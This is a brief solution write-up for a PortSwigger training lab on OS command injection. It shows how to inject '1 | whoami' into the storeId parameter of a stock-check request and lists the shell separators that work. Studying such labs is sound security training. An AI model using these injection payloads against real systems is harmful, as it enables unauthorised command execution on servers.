# Lab 01 — OS command injection, simple case

> **Apprentice** · [Official lab](https://portswigger.net/web-security/os-command-injection/lab-simple)

**Entry point:** product stock check — `storeId` is passed to a shell command.

## Solution

1. Intercept `POST /product/stock` (params `productId`, `storeId`).
2. Inject a separator plus the target command into `storeId`:

```
1 | whoami
```

(URL-encode: `1%20%7C%20whoami`)

3. The response contains `product stock: carlos` — command output confirmed
   — lab solved.

## Notes

Any separator works (`|`, `&`, `;`, `&&`); `|` pipes the previous command's
output into `whoami`, so its result replaces the stock value in the response.
